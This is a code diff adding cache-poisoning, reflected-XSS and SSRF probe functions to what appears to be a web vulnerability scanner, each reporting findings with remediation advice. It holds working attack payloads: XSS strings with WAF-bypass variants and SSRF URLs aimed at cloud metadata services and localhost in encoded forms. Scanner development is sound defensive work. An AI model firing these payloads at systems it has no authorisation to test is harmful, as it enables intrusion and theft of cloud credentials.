@@ -359,4 +359,425 @@ async def run_bare_root_sqli_probe(
     return findings
 
 
-__all__ = ["run_bare_root_sqli_probe"]
+# ═══════════════════════════════════════════════════════════════════════
+# GAP 2 — Web Cache Poisoning Probe
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Bug bounty researchers find cache poisoning by injecting headers like
+# X-Forwarded-Host that get reflected into cached responses (Location
+# redirect, meta refresh, asset URLs).  This probe:
+#   1. Sends a normal GET, records the response body/headers.
+#   2. Sends the same GET with poisoning headers containing a unique canary.
+#   3. If the canary appears in the response body or Location header,
+#      the app is reflecting unkeyed inputs — potential cache poisoning.
+#   4. Fetches the URL again WITHOUT the header to see if the poisoned
+#      response was cached (canary still present → confirmed).
+
+_CACHE_POISON_HEADERS: list[tuple[str, str]] = [
+    ("X-Forwarded-Host", "{canary}"),
+    ("X-Host", "{canary}"),
+    ("X-Original-URL", "/{canary}"),
+    ("X-Rewrite-URL", "/{canary}"),
+    ("X-Forwarded-Scheme", "nothttps"),
+    ("X-Forwarded-Port", "1337"),
+    ("X-Forwarded-Prefix", "/{canary}"),
+]
+
+
+async def run_cache_poisoning_probe(
+    http_client,
+    hosts: Iterable[str],
+    *,
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Probe each host for web cache poisoning via unkeyed header reflection."""
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda event, data: None)
+
+    targets = _normalize_hosts(hosts)
+    if not targets:
+        return findings
+
+    _progress("active_baseline_start", {
+        "probe": "cache_poisoning", "hosts": len(targets),
+    })
+
+    import hashlib, os  # noqa: E401
+    canary = f"cpcanary{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+        base_url = f"https://{host}/"
+        try:
+            baseline_resp = await http_client.get(
+                base_url, timeout=10.0, follow_redirects=False, headers=_PROBE_HEADERS,
+            )
+            baseline_body = baseline_resp.text[:50_000]
+        except Exception:
+            continue
+
+        for hdr_name, hdr_tpl in _CACHE_POISON_HEADERS:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            hdr_val = hdr_tpl.format(canary=canary)
+            probe_headers = {**_PROBE_HEADERS, hdr_name: hdr_val}
+            cache_buster = f"cb={hashlib.md5(os.urandom(4)).hexdigest()[:6]}"
+            probe_url = f"{base_url}?{cache_buster}"
+            try:
+                probe_resp = await http_client.get(
+                    probe_url, timeout=10.0, follow_redirects=False,
+                    headers=probe_headers,
+                )
+            except Exception:
+                continue
+
+            reflected = False
+            location = str(probe_resp.headers.get("location", ""))
+            body = probe_resp.text[:50_000]
+            if canary in body or canary in location:
+                reflected = True
+
+            if not reflected:
+                continue
+
+            _progress("active_baseline_step", {
+                "host": host, "step": "cache_poison_reflected",
+                "header": hdr_name, "canary": canary,
+            })
+
+            await asyncio.sleep(1.0)
+            try:
+                verify_resp = await http_client.get(
+                    probe_url, timeout=10.0, follow_redirects=False,
+                    headers=_PROBE_HEADERS,
+                )
+                verify_body = verify_resp.text[:50_000]
+                verify_location = str(verify_resp.headers.get("location", ""))
+                cached = canary in verify_body or canary in verify_location
+            except Exception:
+                cached = False
+
+            severity = "High" if cached else "Medium"
+            confidence = "High" if cached else "Medium"
+            f = {
+                "title": f"Web Cache Poisoning via {hdr_name}",
+                "severity": severity,
+                "confidence": confidence,
+                "owasp_category": "A05:2021",
+                "cwe": "CWE-444",
+                "url": probe_url,
+                "parameter": hdr_name,
+                "payload": f"{hdr_name}: {hdr_val}",
+                "evidence": (
+                    f"Canary '{canary}' reflected in "
+                    f"{'response body' if canary in body else 'Location header'} "
+                    f"when sent via {hdr_name}. "
+                    f"Cache verification: {'CACHED (confirmed poisoning)' if cached else 'not cached (reflection only)'}."
+                ),
+                "remediation": (
+                    f"Ensure {hdr_name} is either stripped by the CDN/cache layer "
+                    f"or included in the cache key. Validate and sanitize all "
+                    f"host-related headers before reflecting them in responses."
+                ),
+                "phase": "Active Baseline (Cache Poisoning)",
+                "tool": "active_baseline.cache_poisoning_probe",
+                "_finding_source": "active_baseline",
+            }
+            findings.append(f)
+            _emit(f)
+
+    _progress("active_baseline_end", {
+        "probe": "cache_poisoning", "findings": len(findings),
+    })
+    return findings
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# GAP 3 — Reflected XSS Canary Probe
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Inject a unique canary string into common reflection points (query
+# params, path segments, fragment). If reflected unencoded in the HTML
+# body, escalate with actual XSS payloads including WAF bypass variants.
+
+_XSS_CANARY_PREFIX = "xsscanary"
+
+_XSS_INJECTION_POINTS: list[tuple[str, str]] = [
+    ("query_q", "?q={canary}"),
+    ("query_search", "?search={canary}"),
+    ("query_name", "?name={canary}"),
+    ("query_redirect", "?redirect={canary}"),
+    ("query_url", "?url={canary}"),
+    ("query_callback", "?callback={canary}"),
+    ("query_next", "?next={canary}"),
+    ("path_segment", "/{canary}"),
+]
+
+_XSS_PAYLOADS: list[tuple[str, str]] = [
+    ("basic_script", '<script>alert("XSS")</script>'),
+    ("img_onerror", '<img src=x onerror=alert(1)>'),
+    ("svg_onload", '<svg onload=alert(1)>'),
+    ("waf_bypass_case", '<ScRiPt>alert(1)</ScRiPt>'),
+    ("waf_bypass_encoding", '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>'),
+    ("waf_bypass_double", '<<script>alert(1)//<</script>'),
+    ("event_handler", '" onfocus=alert(1) autofocus="'),
+    ("template_literal", '${alert(1)}'),
+    ("js_uri", 'javascript:alert(1)'),
+]
+
+
+async def run_reflected_xss_probe(
+    http_client,
+    hosts: Iterable[str],
+    *,
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Probe each host for reflected XSS via canary injection + WAF bypass."""
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda event, data: None)
+
+    targets = _normalize_hosts(hosts)
+    if not targets:
+        return findings
+
+    _progress("active_baseline_start", {
+        "probe": "reflected_xss", "hosts": len(targets),
+    })
+
+    import hashlib, os  # noqa: E401
+    canary = f"{_XSS_CANARY_PREFIX}{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+        base_url = f"https://{host}"
+
+        reflection_points: list[tuple[str, str]] = []
+        for label, tpl in _XSS_INJECTION_POINTS:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            test_url = f"{base_url}{tpl.format(canary=canary)}"
+            try:
+                resp = await http_client.get(
+                    test_url, timeout=10.0, follow_redirects=True, headers=_PROBE_HEADERS,
+                )
+                if canary in resp.text:
+                    reflection_points.append((label, tpl))
+                    _progress("active_baseline_step", {
+                        "host": host, "step": "xss_reflection_found",
+                        "point": label,
+                    })
+            except Exception:
+                continue
+
+        if not reflection_points:
+            continue
+
+        for point_label, point_tpl in reflection_points[:3]:
+            for payload_label, payload in _XSS_PAYLOADS:
+                if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                    break
+                test_url = f"{base_url}{point_tpl.format(canary=payload)}"
+                try:
+                    resp = await http_client.get(
+                        test_url, timeout=10.0, follow_redirects=True,
+                        headers=_PROBE_HEADERS,
+                    )
+                    body = resp.text[:100_000]
+                except Exception:
+                    continue
+
+                if payload not in body:
+                    continue
+
+                f = {
+                    "title": f"Reflected XSS via {point_label}",
+                    "severity": "High",
+                    "confidence": "High",
+                    "owasp_category": "A03:2021",
+                    "cwe": "CWE-79",
+                    "url": test_url,
+                    "parameter": point_label,
+                    "payload": payload,
+                    "evidence": (
+                        f"Payload '{payload_label}' reflected unencoded in response body "
+                        f"at {test_url}. The payload [{payload}] appears verbatim in "
+                        f"the HTML response, confirming reflected XSS."
+                    ),
+                    "remediation": (
+                        "HTML-encode all user input before reflecting it in the page. "
+                        "Implement a Content-Security-Policy header to mitigate "
+                        "exploitation even if encoding is missed."
+                    ),
+                    "phase": "Active Baseline (Reflected XSS)",
+                    "tool": "active_baseline.reflected_xss_probe",
+                    "_finding_source": "active_baseline",
+                    "_payload_label": payload_label,
+                }
+                findings.append(f)
+                _emit(f)
+                break
+
+    _progress("active_baseline_end", {
+        "probe": "reflected_xss", "findings": len(findings),
+    })
+    return findings
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# GAP 4 — SSRF Bypass Probe
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Test common SSRF bypass techniques: metadata endpoints with IP
+# encoding variants, redirect chains, cloud provider metadata services.
+
+_SSRF_INJECTION_POINTS: list[tuple[str, str]] = [
+    ("query_url", "?url={payload}"),
+    ("query_redirect", "?redirect={payload}"),
+    ("query_next", "?next={payload}"),
+    ("query_target", "?target={payload}"),
+    ("query_dest", "?dest={payload}"),
+    ("query_return", "?return_to={payload}"),
+    ("query_callback", "?callback={payload}"),
+    ("query_path", "?path={payload}"),
+    ("query_proxy", "?proxy={payload}"),
+    ("query_fetch", "?fetch={payload}"),
+]
+
+_SSRF_PAYLOADS: list[tuple[str, str, str]] = [
+    ("aws_metadata_plain", "http://169.254.169.254/latest/meta-data/", "ami-id"),
+    ("aws_metadata_hex", "http://0xa9fea9fe/latest/meta-data/", "ami-id"),
+    ("aws_metadata_decimal", "http://2852039166/latest/meta-data/", "ami-id"),
+    ("aws_metadata_ipv6", "http://[::ffff:169.254.169.254]/latest/meta-data/", "ami-id"),
+    ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/", "attributes"),
+    ("localhost_127001", "http://127.0.0.1:80/", ""),
+    ("localhost_hex", "http://0x7f000001/", ""),
+    ("localhost_decimal", "http://2130706433/", ""),
+    ("localhost_ipv6", "http://[::1]/", ""),
+    ("localhost_short", "http://127.1/", ""),
+    ("localhost_0000", "http://0.0.0.0/", ""),
+]
+
+
+async def run_ssrf_probe(
+    http_client,
+    hosts: Iterable[str],
+    *,
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Probe each host for SSRF via URL parameter injection with bypass techniques."""
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda event, data: None)
+
+    targets = _normalize_hosts(hosts)
+    if not targets:
+        return findings
+
+    _progress("active_baseline_start", {
+        "probe": "ssrf_bypass", "hosts": len(targets),
+    })
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+        base_url = f"https://{host}"
+
+        for point_label, point_tpl in _SSRF_INJECTION_POINTS:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            benign_url = f"{base_url}{point_tpl.format(payload='https://example.com/')}"
+            try:
+                benign_resp = await http_client.get(
+                    benign_url, timeout=10.0, follow_redirects=False,
+                    headers=_PROBE_HEADERS,
+                )
+                benign_status = benign_resp.status_code
+            except Exception:
+                continue
+
+            if benign_status in (404, 405, 501):
+                continue
+
+            for payload_label, payload_url, fingerprint in _SSRF_PAYLOADS:
+                if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                    break
+                test_url = f"{base_url}{point_tpl.format(payload=payload_url)}"
+                try:
+                    resp = await http_client.get(
+                        test_url, timeout=10.0, follow_redirects=False,
+                        headers=_PROBE_HEADERS,
+                    )
+                    body = resp.text[:100_000]
+                    status = resp.status_code
+                except Exception:
+                    continue
+
+                is_ssrf = False
+                evidence_detail = ""
+
+                if fingerprint and fingerprint in body:
+                    is_ssrf = True
+                    evidence_detail = f"Cloud metadata fingerprint '{fingerprint}' found in response body."
+                elif (status == 200 and benign_status != 200
+                      and len(body) > 100
+                      and "169.254" not in str(benign_resp.text[:1000])):
+                    is_ssrf = True
+                    evidence_detail = (
+                        f"Status changed from {benign_status} (benign) to {status} (SSRF payload). "
+                        f"Response body length: {len(body)} chars."
+                    )
+
+                if not is_ssrf:
+                    continue
+
+                f = {
+                    "title": f"SSRF via {point_label} ({payload_label})",
+                    "severity": "Critical" if "metadata" in payload_label else "High",
+                    "confidence": "High" if fingerprint else "Medium",
+                    "owasp_category": "A10:2021",
+                    "cwe": "CWE-918",
+                    "url": test_url,
+                    "parameter": point_label,
+                    "payload": payload_url,
+                    "evidence": (
+                        f"SSRF bypass payload '{payload_label}' ({payload_url}) "
+                        f"injected via {point_label}. {evidence_detail}"
+                    ),
+                    "remediation": (
+                        "Validate and sanitize all URL inputs server-side. "
+                        "Use an allow-list of permitted domains/IPs. "
+                        "Block requests to internal IP ranges (169.254.x.x, "
+                        "127.x.x.x, 10.x.x.x, ::1, etc.) at the network level. "
+                        "Disable cloud metadata access from application containers."
+                    ),
+                    "phase": "Active Baseline (SSRF Bypass)",
+                    "tool": "active_baseline.ssrf_probe",
+                    "_finding_source": "active_baseline",
+                    "_payload_label": payload_label,
+                }
+                findings.append(f)
+                _emit(f)
+                break
+
+    _progress("active_baseline_end", {
+        "probe": "ssrf_bypass", "findings": len(findings),
+    })
+    return findings
+
+
+__all__ = [
+    "run_bare_root_sqli_probe",
+    "run_cache_poisoning_probe",
+    "run_reflected_xss_probe",
+    "run_ssrf_probe",
+]
